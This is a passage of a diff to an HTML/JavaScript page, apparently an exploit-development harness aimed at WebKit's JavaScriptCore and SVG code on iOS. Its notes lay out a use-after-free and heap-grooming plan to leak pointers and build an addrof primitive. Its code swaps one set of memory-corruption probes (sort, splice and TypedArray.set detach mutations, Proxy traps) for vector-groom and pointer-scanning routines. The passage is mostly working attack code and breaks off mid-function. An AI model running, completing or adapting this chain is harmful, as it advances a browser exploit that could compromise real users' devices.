@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>SVG UAF v43</title>
+<title>SVG UAF v44</title>
 <style>
 *{margin:0;padding:0;box-sizing:border-box}
 body{background:#0d0d0d;color:#00ff41;font-family:'Courier New',monospace;padding:16px;min-height:100vh}
@@ -38,66 +38,81 @@ button:disabled{opacity:.3}
 </style>
 </head>
 <body>
-<h2>SVG UAF v43 — JSC heap attack pivot</h2>
+<h2>SVG UAF v44 — WTF::fastMalloc vector groom</h2>
 <div class="sub">
-v42 CONCLUSION: IsoHeap on iOS 26.5.2 is STRICT BUMP-ONLY.
-PAW5 definitive: filled bump page to exact capacity for every sizeof guess (8-32).
-Freed A. Allocated ONE more. Still fresh identity. Freelist physically exists but allocate() NEVER reads it.
-This is a documented Spectre mitigation in WebKit's iOS renderer process.
-IsoHeap groom path is architecturally impossible on this target.
+v43 ANALYSIS:
+- SRT1/SPL1/PRX1/REP1/WKR1/OOB1/LEN1: JSC hardening holding clean — generic type confusion blocked
+- CLN1: structuredClone correctly rejects Proxy objects
+- SET1-A: ta.set() DID NOT THROW after buf.transfer() detached the buffer mid-operation
+  → JSC snapshots backing store ptr before loop → writes continue into transferred buffer
+  → no throw = buf.transfer() during set() is a write-to-transferred-memory pattern
+- ANI1: SMIL IS running on iOS 26 WKWebView (animVal ≠ baseVal confirmed)
+  → animVal refs survive parent svg removal → kept alive by JS wrappers
+  → SMIL engine continues updating m_value of detached animVal SVGNumbers
 
-PIVOT: Attack the JSC (JavaScript engine) heap directly.
-IsoHeap is for C++ DOM objects. JSC has its own MarkedSpace heap for JS objects.
-JSC type confusion = addrof + fakeobj primitive → we skip IsoHeap groom entirely.
+KEY INSIGHT — wrong allocator all along:
+  IsoHeap<SVGNumber>: stores individual SVGNumber C++ objects → bump-only → DEAD
+  WTF::fastMalloc: stores SVGList<T>'s INTERNAL VECTOR backing store (array of pointers)
 
-ATTACK SURFACES (known CVE patterns for JSC on iOS):
-1. Array.prototype.sort comparator mutation — mutate array length/type during comparison callback
-2. Array.prototype.splice with getter that shrinks array mid-operation
-3. TypedArray.prototype.set with source getter that detaches the target buffer
-4. structuredClone Proxy trap — change object type mid-deep-clone
-5. for..of iteration with early length mutation via Proxy
-6. RegExp.prototype[Symbol.replace] with mutation callback
-7. WeakRef + FinalizationRegistry timing race
+  Vector<Ref<SVGNumber>> for a 20-element list = 20 × 8 bytes = 160 bytes
+  This 160-byte block is in WTF::fastMalloc, NOT IsoHeap.
+  WTF::fastMalloc uses bmalloc's non-ISO (size-class) path → FREELIST IS USED.
 
-DETECTION SIGNALS:
-- Crash → good (hit something real, need to control it)
-- Unexpected value read from typed array → OOB access
-- Float64Array containing pointer-shaped values → addrof leak
-- typeof confusion (expect number, get object) → type confusion confirmed
+  ATTACK: force vector reallocation → freed vector backing store lands in WTF::fastMalloc
+  freelist → groom with ArrayBuffer → read ArrayBuffer → POINTER LEAK of Ref<SVGNumber>
+  addresses → addrof primitive!
+
+NEW ATTACK SURFACE:
+  SVGAnimatedLengthList.dx/dy on <text> elements = variable-size SVGLength list
+  Grow the list → old vector backing store freed → groom window
+  SVGFEColorMatrixElement type=matrix → type=saturate (20→1 values) → vector shrinks
+  feConvolveMatrix kernelMatrix size change → variable vector size
 
 SUITES:
-SRT1: Sort comparator mutation (array shrink + type change during sort callback)
-SPL1: Splice getter mutation (shrink array inside element getter during splice)
-SET1: TypedArray.set with detach-on-read getter
-CLN1: structuredClone Proxy trap (change species/type during clone)
-PRX1: for..of with Proxy length lie during iteration
-REP1: String.replace with array-mutation match callback
-WKR1: WeakRef race — get WeakRef, force GC, read deref timing
-ANI1: SVG SMIL animVal/baseVal allocation race (does animVal use different allocator?)
-LEN1: Array.from(proxy) length mutation attack
-OOB1: Float64Array OOB probe — detect if any JSC OOB read leaks pointer-shaped data
+VEC1: SVGLengthList (text.dx) vector backing store groom
+  → grow/shrink list → groom freed vector slot with ArrayBuffer → pointer leak probe
+VEC2: SVGNumberList type-change groom
+  → feColorMatrix matrix→saturate (20→1 values) → vector freed → ArrayBuffer groom
+VEC3: feConvolveMatrix kernelMatrix size mutation
+  → kernelSize change → variable vector growth/shrink → groom with ArrayBuffer
+TRN1: SET1-A follow-up — capture transferred buffer, measure where set() writes went
+  → buf = ArrayBuffer(N), ta = Float64Array(buf)
+  → during ta.set(srcA), srcA[k] getter calls newBuf = buf.transfer()
+  → AFTER set: check newBuf for the written values (confirm write-to-transferred-memory)
+  → BONUS: try to detect if any adjacent allocation contaminated
+WAS1: WebAssembly Memory.grow() TypedArray invalidation
+  → wasm memory, Float64Array view, memory.grow() → detaches old buffer
+  → continue accessing Float64Array → behavior on detached wasm memory
+SAB1: SharedArrayBuffer + Worker availability check
+  → test if SAB is available in WKWebView iOS 26
+  → if YES: Worker race conditions are possible for next iteration
+SET2: SET1-A exploitation attempt — two adjacent ArrayBuffers, detach-mid-set
+  → alloc A(1024) and B(1024) adjacent, create views, detach A mid-set
+  → try to see if set() can write into B's region
+ANI2: SMIL-trigger freelist probe
+  → build freelist of SVGNumbers FIRST (remove many matrices)
+  → THEN create NEW animation → animVal allocations at creation time
+  → check if any animVal SVGNumber landed on freed baseVal slot
+  → (tests whether SMIL allocator path uses freelist vs JS path)
 
-ALL TESTS: report crash/no-crash, unexpected values, type confusion indicators.
-If any test causes: undefined behavior, wrong typeof, NaN where not expected,
-pointer-shaped values (> 0x100000000) in typed arrays → MARK AS HIT.
+POINTER DETECTION: float64 value with bits 0x0000_00xx_xxxx_xxxx (arm64 userspace ptr)
+GROOM SUCCESS: ArrayBuffer read contains pointer-shaped values after vector free
 </div>
 <div id="controls">
-  <button onclick="runSRT1()">SRT1</button>
-  <button onclick="runSPL1()">SPL1</button>
-  <button onclick="runSET1()">SET1</button>
-  <button onclick="runCLN1()">CLN1</button>
-  <button onclick="runPRX1()">PRX1</button>
-  <button onclick="runREP1()">REP1</button>
-  <button onclick="runWKR1()">WKR1</button>
-  <button onclick="runANI1()">ANI1</button>
-  <button onclick="runLEN1()">LEN1</button>
-  <button onclick="runOOB1()">OOB1</button>
+  <button onclick="runVEC1()">VEC1</button>
+  <button onclick="runVEC2()">VEC2</button>
+  <button onclick="runVEC3()">VEC3</button>
+  <button onclick="runTRN1()">TRN1</button>
+  <button onclick="runWAS1()">WAS1</button>
+  <button onclick="runSAB1()">SAB1</button>
+  <button onclick="runSET2()">SET2</button>
+  <button onclick="runANI2()">ANI2</button>
   <button onclick="runAll()">RUN ALL</button>
   <button onclick="copyLog()">COPY</button>
   <button onclick="clearAll()">CLR</button>
 </div>
 <div id="log"></div>
-<div id="sp"><div class="sh">⚡ v43 — EXPLOIT CHAIN STATUS</div><div class="sb" id="sb"></div></div>
+<div id="sp"><div class="sh">⚡ v44 — EXPLOIT CHAIN STATUS</div><div class="sb" id="sb"></div></div>
 <script>
 var SVG_NS='http://www.w3.org/2000/svg';
 var EL=document.getElementById('log');
@@ -105,16 +120,14 @@ var SP=document.getElementById('sp');
 var SB=document.getElementById('sb');
 
 var R={
-  srt1:{hit:false,crash:false,oob:false,confused:false,detail:''},
-  spl1:{hit:false,crash:false,oob:false,confused:false,detail:''},
-  set1:{hit:false,crash:false,oob:false,confused:false,detail:''},
-  cln1:{hit:false,crash:false,oob:false,confused:false,detail:''},
-  prx1:{hit:false,crash:false,oob:false,confused:false,detail:''},
-  rep1:{hit:false,crash:false,oob:false,confused:false,detail:''},
-  wkr1:{hit:false,crash:false,oob:false,confused:false,detail:''},
-  ani1:{hit:false,detail:''},
-  len1:{hit:false,crash:false,oob:false,detail:''},
-  oob1:{hit:false,leak:null,detail:''},
+  vec1:{hit:false,ptrs:[],detail:''},
+  vec2:{hit:false,ptrs:[],detail:''},
+  vec3:{hit:false,ptrs:[],detail:''},
+  trn1:{hit:false,writeConfirmed:false,detail:''},
+  was1:{hit:false,detail:''},
+  sab1:{available:false,detail:''},
+  set2:{hit:false,detail:''},
+  ani2:{hit:false,detail:''},
 };
 
 function log(m,c){var s=document.createElement('span');if(c)s.className=c;s.textContent=m+'\n';EL.appendChild(s);EL.scrollTop=EL.scrollHeight;}
@@ -126,870 +139,843 @@ function clearAll(){EL.innerHTML='';SP.classList.remove('on');SB.innerHTML='';}
 function dis(d){var b=document.querySelectorAll('button');for(var i=0;i<b.length;i++){var f=b[i].getAttribute('onclick')||'';if(f.indexOf('copy')===-1&&f.indexOf('clear')===-1)b[i].disabled=d;}}
 window.onerror=function(m,u,l){log('[CRASH/EXCEPTION] '+m+' L'+l,'bad');return false;};
 
-// Pointer-shaped value detector: values > 2^31 that look like ARM64 userspace addresses
-function isPointerLike(v){
-  if(typeof v!=='number'||!isFinite(v))return false;
-  // ARM64 userspace: 0x100000000 - 0x7FFFFFFFFFFF, or lower mapped regions
-  var b=new ArrayBuffer(8);var d=new DataView(b);d.setFloat64(0,v,true);
-  var hi=d.getUint32(4,true);
-  // pointer-like: upper 32 bits non-zero, not a normal float pattern
-  return hi>0x10000&&hi<0x00010000; // userspace arm64 range
-}
-
-// Better: use bitwise reinterpretation
+// Pointer analysis helpers
 function f64bits(v){
   var b=new ArrayBuffer(8);var d=new DataView(b);d.setFloat64(0,v,false);
-  var hi=d.getUint32(0,false),lo=d.getUint32(4,false);
-  return{hi:hi,lo:lo,hex:'0x'+hi.toString(16).padStart(8,'0')+lo.toString(16).padStart(8,'0')};
+  return{hi:d.getUint32(0,false),lo:d.getUint32(4,false),
+    hex:'0x'+d.getUint32(0,false).toString(16).padStart(8,'0')+d.getUint32(4,false).toString(16).padStart(8,'0')};
 }
-
-function looksLikePointer(v){
-  if(!isFinite(v)||isNaN(v))return false;
+function looksLikePtr(v){
+  if(!isFinite(v)||isNaN(v)||v===0)return false;
   var b=f64bits(v);
-  // ARM64 userspace addresses: 0x0000_0001_xxxx_xxxx to 0x0000_0002_xxxx_xxxx typical app range
-  // or kernel addresses 0xffff... (don't want those)
-  // just look for values > 0x100000000 (4GB) with small upper bits
-  return b.hi>=1&&b.hi<=0x00007FFF;
+  // arm64 userspace: upper 32 bits = 0x00000001 to 0x00007fff (typical iOS app range)
+  // Also detect kernel-tagged ptrs and pac-bits ptrs
+  return(b.hi>=1&&b.hi<=0x00007fff);
 }
-
-function checkForLeaks(arr,label){
+function scanForPtrs(arr,label){
   var hits=[];
   for(var i=0;i<arr.length;i++){
     var v=arr[i];
-    if(looksLikePointer(v)){var bits=f64bits(v);hits.push({idx:i,val:v,hex:bits.hex});}
-  }
-  if(hits.length>0){
-    log('  '+label+': ⚠️ POINTER-LIKE VALUES FOUND!','win');
-    for(var i=0;i<Math.min(hits.length,5);i++){
-      log('    ['+hits[i].idx+']='+hits[i].hex,'win');
+    if(looksLikePtr(v)){
+      var b=f64bits(v);
+      hits.push({idx:i,val:v,hex:b.hex,hi:b.hi,lo:b.lo});
+      log('  ['+label+']['+i+']='+b.hex+' ★ POINTER','win');
     }
   }
   return hits;
 }
 
-/*
- * SRT1: Array.prototype.sort comparator mutation
- *
- * CLASSIC JSC BUG PATTERN (multiple CVEs: CVE-2019-8518, CVE-2022-32899, etc.)
- *
- * During Array.prototype.sort, JSC calls the comparator callback.
- * If the callback modifies the array (changes length, changes element type,
- * replaces the array with a holey/dense switch), JSC may have cached the
- * array's butterfly pointer or length before the modification.
- *
- * Attack variants:
- * A) Change array length to 0 inside comparator → JSC continues iterating → OOB
- * B) Change array to contain objects instead of doubles → type confusion (unboxed→boxed)
- * C) Replace array contents with Float64 that encodes a pointer
- * D) Delete element during sort (create hole) → JSC reads undefined slot as pointer
- *
- * Detection: after sort, scan array for pointer-like values or wrong typeof.
- */
-async function runSRT1(q){
-  if(!q){dis(true);sep();log('SRT1: Array.prototype.sort comparator mutation','inf');sep();}
-  var fired=0,oobs=[],confused=false;
-
-  // Variant A: shrink array to 0 during sort
-  try{
-    var a=[];for(var i=0;i<1000;i++)a.push(Math.random());
-    var orig_len=a.length;
-    var trigger=false;
-    a.sort(function(x,y){
-      if(!trigger&&fired>50){trigger=true;a.length=0;}
-      fired++;
-      return x-y;
-    });
-    log('  SrtA: sorted, array.length='+a.length+' (orig='+orig_len+'), comparator calls='+fired,'dim');
-  }catch(e){R.srt1.crash=true;log('  SrtA EXCEPTION: '+e,'bad');}
-  await raf();
-
-  // Variant B: change element types during sort (double→object transition)
-  try{
-    var b=[];for(var i=0;i<500;i++)b.push(i*1.1);
-    var bFire=0;
-    b.sort(function(x,y){
-      if(bFire===100){
-        // convert doubles to objects mid-sort → double array becomes polymorphic
-        for(var k=0;k<100;k++)b[k]={v:k};
-      }
-      bFire++;
-      return x-y;
-    });
-    var bTypes=new Set();for(var i=0;i<Math.min(b.length,50);i++)bTypes.add(typeof b[i]);
-    log('  SrtB: done, types in result: ['+Array.from(bTypes).join(',')+'] (expect: object,undefined,number)','dim');
-    if(bTypes.has('number')&&bTypes.has('object'))confused=true;
-    // Check for leaked pointer values in numeric entries
-    var numVals=b.filter(function(v){return typeof v==='number';});
-    var leaks=checkForLeaks(numVals,'SrtB');
-    if(leaks.length>0){R.srt1.hit=true;R.srt1.oob=true;oobs=oobs.concat(leaks);}
-  }catch(e){R.srt1.crash=true;log('  SrtB EXCEPTION: '+e,'bad');}
-  await raf();
-
-  // Variant C: replace sorted array element with Float64 pointer bait
-  try{
-    var FAKE_PTR=2.3023397192444507e-308; // 0x00007fff_deadbeef as f64
-    var c=[];for(var i=0;i<200;i++)c.push(i*1.0);
-    var cFire=0;
-    c.sort(function(x,y){
-      if(cFire===30){
-        // inject pointer-shaped float into array at a specific index
-        c[0]=FAKE_PTR;c[1]=FAKE_PTR;c[2]=FAKE_PTR;
-      }
-      cFire++;return x-y;
-    });
-    // check if pointer bait propagated into result or caused issues
-    var cLeaks=c.filter(function(v){return typeof v==='number'&&Math.abs(v-FAKE_PTR)<1e-320;});
-    log('  SrtC: pointer-bait entries in result: '+cLeaks.length,'dim');
-  }catch(e){R.srt1.crash=true;log('  SrtC EXCEPTION: '+e,'bad');}
-  await raf();
-
-  // Variant D: hole creation during sort (delete element → undefined slot → JSC reads raw memory?)
-  try{
-    var d=[];for(var i=0;i<300;i++)d.push(i*2.5);
-    var dFire=0;var dHoles=0;
-    d.sort(function(x,y){
-      if(dFire%50===49&&dFire<150){delete d[dFire];dHoles++;}
-      dFire++;return x-y;
-    });
-    // Check if any undefined slots contain non-undefined when accessed as Float64
-    var dResults=[];
-    for(var i=0;i<d.length;i++)dResults.push(d[i]);
-    var dLeaks=checkForLeaks(dResults,'SrtD');
-    log('  SrtD: created '+dHoles+' holes during sort, leak check done','dim');
-    if(dLeaks.length>0){R.srt1.hit=true;R.srt1.oob=true;}
-  }catch(e){R.srt1.crash=true;log('  SrtD EXCEPTION: '+e,'bad');}
-
-  R.srt1.confused=confused;
-  R.srt1.detail='fired='+fired+' confused='+confused+' crash='+R.srt1.crash;
-  log('  SRT1: hit='+R.srt1.hit+' oob='+R.srt1.oob+' confused='+confused+' crash='+R.srt1.crash,R.srt1.hit?'win':'dim');
-  if(!q)dis(false);
+// Make feColorMatrix
+function makeFCM(vals,fid){
+  fid=fid||('f'+Math.random().toString(36).slice(2,8));
+  var svg=document.createElementNS(SVG_NS,'svg');
+  svg.setAttribute('width','1');svg.setAttribute('height','1');
+  svg.style.cssText='position:fixed;top:-9999px;left:-9999px;opacity:0;pointer-events:none';
+  var defs=document.createElementNS(SVG_NS,'defs');
+  var filt=document.createElementNS(SVG_NS,'filter');filt.setAttribute('id',fid);
+  var fcm=document.createElementNS(SVG_NS,'feColorMatrix');
+  fcm.setAttribute('type','matrix');
+  fcm.setAttribute('values',(vals||identity20()).join(' '));
+  filt.appendChild(fcm);defs.appendChild(filt);svg.appendChild(defs);
+  document.body.appendChild(svg);
+  return{svg:svg,fcm:fcm};
 }
+function identity20(){return[1,0,0,0,0,0,1,0,0,0,0,0,1,0,0,0,0,0,1,0];}
+function cleanupD(d){if(d&&d.svg&&d.svg.parentNode)d.svg.parentNode.removeChild(d.svg);}
 
 /*
- * SPL1: Array.prototype.splice with length-mutating getter
+ * VEC1: SVGLengthList vector backing store groom
  *
- * splice(start, deleteCount) reads elements[start..start+deleteCount] and shifts the rest.
- * If an element getter fires during splice and CHANGES the array length,
- * JSC might read past the new end → OOB read.
+ * SVGAnimatedLengthList (e.g. text.dx) stores items in a WTF::Vector<Ref<SVGLength>>.
+ * The vector backing store = N * sizeof(Ref<SVGLength>) = N * 8 bytes.
+ * When the list grows, WTF::Vector reallocates: old backing store freed to WTF::fastMalloc.
+ * WTF::fastMalloc is bmalloc non-ISO = freelist-based = REUSABLE.
  *
- * Pattern: place an Object.defineProperty getter on element[k] that sets a.length=k
- * when accessed during splice. JSC has already read length=N and is iterating.
+ * PLAN:
+ * 1. Create <text> with dx="v1 v2 v3" (3 items → 24-byte vector backing store)
+ * 2. Grow dx to 20 items → WTF::Vector grows → old 24-byte block freed
+ * 3. Immediately alloc ArrayBuffer(24) → might land at freed 24-byte slot
+ * 4. Scan ArrayBuffer as Float64 → pointer-shaped values = leaked SVGLength addresses
+ *
+ * Also try: alloc many ArrayBuffers of various sizes to increase hit probability
  */
-async function runSPL1(q){
-  if(!q){dis(true);sep();log('SPL1: Splice getter length mutation','inf');sep();}
-
-  // Variant A: getter shrinks array during splice read phase
-  try{
-    var a=new Array(1000);
-    for(var i=0;i<1000;i++)a[i]=i*1.1;
-    var triggered=false;
-    Object.defineProperty(a,500,{
-      get:function(){
-        if(!triggered){triggered=true;a.length=10;} // shrink array during splice
-        return 500.5;
-      },configurable:true
-    });
-    var removed=a.splice(0,600); // try to remove 600 elements
-    log('  SplA: splice removed='+removed.length+', array.length after='+a.length+' (expected ~400 or 0)','dim');
-    var aLeaks=checkForLeaks(removed,'SplA');
-    if(aLeaks.length>0)R.spl1.hit=true;
-  }catch(e){R.spl1.crash=true;log('  SplA EXCEPTION: '+e,'bad');}
-  await raf();
-
-  // Variant B: getter on element that runs GC via giant allocation
-  try{
-    var b=new Array(500);for(var i=0;i<500;i++)b[i]=i*2.2;
-    var gcFired=false;
-    Object.defineProperty(b,100,{
-      get:function(){
-        if(!gcFired){gcFired=true;
-          // alloc a ton of garbage to trigger GC
-          var garbage=[];for(var k=0;k<200000;k++)garbage.push({a:k,b:new Array(4).fill(k)});
-          garbage=null;
-        }
-        return 100.1;
-      },configurable:true
-    });
-    var removed2=b.splice(50,200);
-    log('  SplB: GC during splice, removed='+removed2.length,'dim');
-    var bLeaks=checkForLeaks(removed2,'SplB');
-    if(bLeaks.length>0)R.spl1.hit=true;
-  }catch(e){R.spl1.crash=true;log('  SplB EXCEPTION: '+e,'bad');}
-  await raf();
-
-  R.spl1.detail='crash='+R.spl1.crash;
-  log('  SPL1: hit='+R.spl1.hit+' crash='+R.spl1.crash,R.spl1.hit?'win':'dim');
-  if(!q)dis(false);
-}
-
-/*
- * SET1: TypedArray.prototype.set with detach-on-read getter
- *
- * TypedArray.set(source, offset) reads from source and writes to target.
- * If source is an Array with a getter that:
- * a) detaches the target TypedArray's buffer (via transfer/postMessage)
- * b) OR grows/shrinks a SAB (SharedArrayBuffer)
- * JSC might continue writing to the detached/invalid buffer.
- *
- * Also test: target.set(source) where source's getter causes target to be
- * reallocated (e.g., by calling target.grow() on a growable ArrayBuffer).
- *
- * Note: postMessage transfer requires actual transfer target. Use
- * ArrayBuffer.prototype.transfer() (newer API) if available.
- */
-async function runSET1(q){
-  if(!q){dis(true);sep();log('SET1: TypedArray.set with detach getter','inf');sep();}
-
-  // Check API availability
-  var hasTransfer=typeof ArrayBuffer.prototype.transfer==='function';
-  var hasGrowable=typeof ArrayBuffer.prototype.resize==='function';
-  log('  ArrayBuffer.transfer available: '+hasTransfer,'dim');
-  log('  ArrayBuffer.resize available: '+hasGrowable,'dim');
-
-  // Variant A: Transfer during set (if transfer available)
-  if(hasTransfer){
-    try{
-      var buf=new ArrayBuffer(4096);
-      var ta=new Float64Array(buf);
-      for(var i=0;i<ta.length;i++)ta[i]=i*1.5;
-      var detached=false;
-      var srcA=new Array(ta.length);
-      for(var i=0;i<srcA.length;i++)srcA[i]=i;
-      Object.defineProperty(srcA,10,{get:function(){
-        if(!detached){detached=true;buf.transfer();} // detach buf
-        return 10.5;
-      },configurable:true});
-      try{ta.set(srcA);}catch(e2){log('  SetA: set threw after detach: '+e2,'inf');}
-      log('  SetA: ta.byteLength after set attempt: '+ta.byteLength,'dim');
-      // If ta.byteLength is still 4096 but buf is detached → confusion
-      if(detached&&ta.byteLength>0){
-        log('  SetA: ⚠️ ta still has byteLength after buf detached!','win');
-        R.set1.confused=true;R.set1.hit=true;
-      }
-    }catch(e){R.set1.crash=true;log('  SetA EXCEPTION: '+e,'bad');}
-    await raf();
-  }
-
-  // Variant B: Resize during set (growable buffer)
-  if(hasGrowable){
-    try{
-      var gbuf=new ArrayBuffer(1024,{maxByteLength:65536});
-      var gta=new Float64Array(gbuf);
-      var resized=false;
-      var srcB=new Array(gta.length);
-      for(var i=0;i<srcB.length;i++)srcB[i]=i;
-      Object.defineProperty(srcB,5,{get:function(){
-        if(!resized){resized=true;gbuf.resize(65536);} // grow during set
-        return 5.5;
-      },configurable:true});
-      gta.set(srcB);
-      log('  SetB: grew buffer during set, gta.length='+gta.length,'dim');
-      var bLeaks=checkForLeaks(Array.from(gta),'SetB');
-      if(bLeaks.length>0)R.set1.hit=true;
-    }catch(e){R.set1.crash=true;log('  SetB EXCEPTION: '+e,'bad');}
-    await raf();
-  }
-
-  // Variant C: TypedArray.prototype.sort with mutation (no-transfer version)
-  try{
-    var ta2=new Float64Array(512);for(var i=0;i<ta2.length;i++)ta2[i]=Math.random();
-    var sortFire=0;var sortMutated=false;
-    ta2.sort(function(a,b){
-      if(!sortMutated&&sortFire>100){
-        sortMutated=true;
-        // write large values that look like pointers
-        for(var k=0;k<20;k++)ta2[k]=4.656612873077393e-10 * (0x0000100100200300+k*0x1000); // fake pointer pattern
-      }
-      sortFire++;return a-b;
-    });
-    var cLeaks=checkForLeaks(Array.from(ta2),'SetC');
-    log('  SetC: sorted Float64Array with mutation, sortFire='+sortFire+' leaks='+cLeaks.length,'dim');
-    if(cLeaks.length>0){R.set1.hit=true;R.set1.oob=true;}
-  }catch(e){R.set1.crash=true;log('  SetC EXCEPTION: '+e,'bad');}
-
-  R.set1.detail='transfer='+hasTransfer+' growable='+hasGrowable+' confused='+R.set1.confused;
-  log('  SET1: hit='+R.set1.hit+' crash='+R.set1.crash,R.set1.hit?'win':'dim');
-  if(!q)dis(false);
-}
-
-/*
- * CLN1: structuredClone Proxy trap type confusion
- *
- * structuredClone() deep-clones JS objects. It uses the "structured clone algorithm"
- * which inspects object types. A Proxy can intercept type-checking operations.
- *
- * If a Proxy's ownKeys/getOwnPropertyDescriptor traps fire during cloning and
- * the trap changes the object's type or structure (e.g., converts plain object
- * to TypedArray view), structuredClone might use the old type assumption with
- * the new object's memory layout.
- *
- * Also test: cloning a Proxy that claims to be a TypedArray.
- */
-async function runCLN1(q){
-  if(!q){dis(true);sep();log('CLN1: structuredClone Proxy trap','inf');sep();}
-
-  if(typeof structuredClone!=='function'){
-    log('  CLN1: structuredClone not available','bad');
-    if(!q)dis(false);return;
-  }
-
-  // Variant A: Proxy that changes type during clone enumeration
-  try{
-    var realBuf=new ArrayBuffer(256);var realTA=new Uint8Array(realBuf);
-    for(var i=0;i<256;i++)realTA[i]=i;
-
-    // Create an object that looks like a plain object but secretly is backed by a buffer
-    var confused=false;
-    var target={length:256,byteLength:256};
-    for(var i=0;i<256;i++)target[i]=i;
-
-    var proxy=new Proxy(target,{
-      get:function(t,p,r){
-        if(p===Symbol.iterator&&!confused){
-          confused=true;
-          // Swap target's internals — replace length with buffer reference
-          Object.defineProperty(target,'length',{value:0,configurable:true});
-        }
-        return t[p];
-      }
-    });
-
-    try{
-      var clone=structuredClone(proxy);
-      log('  ClnA: clone.length='+clone.length+' (expected 256 or 0)','dim');
-    }catch(e2){log('  ClnA: threw: '+e2,'inf');}
-  }catch(e){R.cln1.crash=true;log('  ClnA EXCEPTION: '+e,'bad');}
-  await raf();
-
-  // Variant B: Clone object with getter that substitutes a TypedArray during key enumeration
-  try{
-    var buf2=new ArrayBuffer(1024);var ta3=new Float64Array(buf2);
-    for(var i=0;i<ta3.length;i++)ta3[i]=i*3.14;
-
-    var obj2={type:'matrix',data:ta3,length:ta3.length};
-    Object.defineProperty(obj2,'data',{
-      get:function(){
-        // First access returns ta3, second access returns a different buffer
-        if(!obj2._accessed){obj2._accessed=true;return ta3;}
-        return new Float64Array(new ArrayBuffer(8)); // different! much smaller!
-      },configurable:true
-    });
-
-    try{
-      var clone2=structuredClone(obj2);
-      log('  ClnB: clone2.data.length='+clone2.data.length+' (expect 128 or 1)','dim');
-      if(clone2.data.length===128){
-        var blLeaks=checkForLeaks(Array.from(clone2.data),'ClnB');
-        if(blLeaks.length>0){R.cln1.hit=true;R.cln1.oob=true;}
-      }
-    }catch(e2){log('  ClnB: threw: '+e2,'inf');}
-  }catch(e){R.cln1.crash=true;log('  ClnB EXCEPTION: '+e,'bad');}
-  await raf();
-
-  // Variant C: structuredClone of a Proxy that claims exotic types
-  try{
-    var proxyC=new Proxy({},{
-      get:function(t,p){
-        if(p===Symbol.toStringTag)return 'ArrayBuffer';
-        if(p==='byteLength')return 65536;
-        if(p==='constructor')return ArrayBuffer;
-        return t[p];
-      }
-    });
-    try{
-      var cloneC=structuredClone(proxyC);
-      log('  ClnC: cloned fake-ArrayBuffer proxy: byteLength='+
-        (cloneC&&cloneC.byteLength),'dim');
-    }catch(e2){log('  ClnC: threw: '+e2,'inf');}
-  }catch(e){R.cln1.crash=true;log('  ClnC EXCEPTION: '+e,'bad');}
-
-  R.cln1.detail='crash='+R.cln1.crash;
-  log('  CLN1: hit='+R.cln1.hit+' crash='+R.cln1.crash,R.cln1.hit?'win':'dim');
-  if(!q)dis(false);
-}
-
-/*
- * PRX1: for..of iteration with Proxy length mutation
- *
- * Array iteration uses [[Get]](index) for each index from 0 to length-1.
- * A Proxy can lie about length initially and change it during iteration.
- *
- * If JSC precomputes the iteration count (reads length once), then the Proxy
- * changes length to something huge, JSC iterates N*1000 times → OOB.
- *
- * Also: Proxy length confusion in Array.from(iterable) → buffer overflow in new array.
- */
-async function runPRX1(q){
-  if(!q){dis(true);sep();log('PRX1: for..of Proxy length mutation','inf');sep();}
-
-  // Variant A: Proxy that returns small length initially, then huge
-  try{
-    var realArr=new Array(10);for(var i=0;i<10;i++)realArr[i]=i*1.5;
-    var callCount=0;
-    var proxy=new Proxy(realArr,{
-      get:function(t,p){
-        callCount++;
-        if(p==='length'){
-          // First time return 10, then return 1000
-          if(callCount<=1)return 10;
-          return 100000;
-        }
-        if(typeof p==='string'&&parseInt(p)>=0){
-          var idx=parseInt(p);
-          if(idx<t.length)return t[idx];
-          return idx*2.718281828; // fake values for OOB indices
-        }
-        return t[p];
-      }
-    });
-
-    var result=[];
-    var iters=0;
-    for(var k in proxy){
-      result.push(proxy[k]);
-      iters++;
-      if(iters>50000)break; // safety
-    }
-    log('  PrxA: for..in iters='+iters+' result.length='+result.length,'dim');
-    var aLeaks=checkForLeaks(result,'PrxA');
-    if(aLeaks.length>0)R.prx1.hit=true;
-  }catch(e){R.prx1.crash=true;log('  PrxA EXCEPTION: '+e,'bad');}
-  await raf();
-
-  // Variant B: Array.from with iterable that claims huge size
-  try{
-    var iter={
-      [Symbol.iterator]:function(){
-        var n=0;
-        return{next:function(){
-          n++;
-          if(n<=5)return{value:n*1.5,done:false};
-          return{value:undefined,done:true};
-        }};
-      },
-      length:100000 // lie about length
-    };
-    var fromResult=Array.from(iter);
-    log('  PrxB: Array.from(huge-length-iter) result.length='+fromResult.length+' (expect 5)','dim');
-    if(fromResult.length>100){R.prx1.oob=true;R.prx1.hit=true;
-      var bLeaks=checkForLeaks(fromResult,'PrxB');
-    }
-  }catch(e){R.prx1.crash=true;log('  PrxB EXCEPTION: '+e,'bad');}
-  await raf();
-
-  // Variant C: Spread operator with length lie
-  try{
-    var fakeArr={length:100000};
-    for(var i=0;i<5;i++)fakeArr[i]=i;
-    try{
-      // This should NOT spread 100000 elements since we only defined 5
-      var spreadResult=[...Array.from({length:5,0:1,1:2,2:3,3:4,4:5})];
-      log('  PrxC: spread result.length='+spreadResult.length,'dim');
-    }catch(e2){log('  PrxC: threw: '+e2,'inf');}
-  }catch(e){R.prx1.crash=true;log('  PrxC EXCEPTION: '+e,'bad');}
-
-  R.prx1.detail='crash='+R.prx1.crash;
-  log('  PRX1: hit='+R.prx1.hit+' oob='+R.prx1.oob+' crash='+R.prx1.crash,R.prx1.hit?'win':'dim');
-  if(!q)dis(false);
-}
-
-/*
- * REP1: RegExp.prototype[Symbol.replace] with array-mutation callback
- *
- * String.prototype.replace(regex, replacer_fn) calls replacer_fn for each match.
- * Inside replacer_fn, mutating global state can cause type confusion if JSC
- * has cached the string's internal buffer pointer.
- *
- * Also: RegExp lastIndex manipulation during match → re-entry confusion.
- */
-async function runREP1(q){
-  if(!q){dis(true);sep();log('REP1: RegExp mutation during match callback','inf');sep();}
-
-  // Variant A: Replace callback that changes the regex being used
-  try{
-    var str='AAAA BBBB CCCC DDDD EEEE FFFF GGGG HHHH';
-    var re=/\w+/g;
-    var callN=0;
-    var result=str.replace(re,function(m){
-      callN++;
-      if(callN===3){re.lastIndex=0;} // reset lastIndex mid-replace
-      return m+'_'+callN;
-    });
-    log('  RepA: calls='+callN+' result.length='+result.length,'dim');
-    // Check if callN > 8 (expected = num words) → regex looped
-    if(callN>20){R.rep1.oob=true;R.rep1.hit=true;log('  RepA: ⚠️ regex fired more than expected!','win');}
-  }catch(e){R.rep1.crash=true;log('  RepA EXCEPTION: '+e,'bad');}
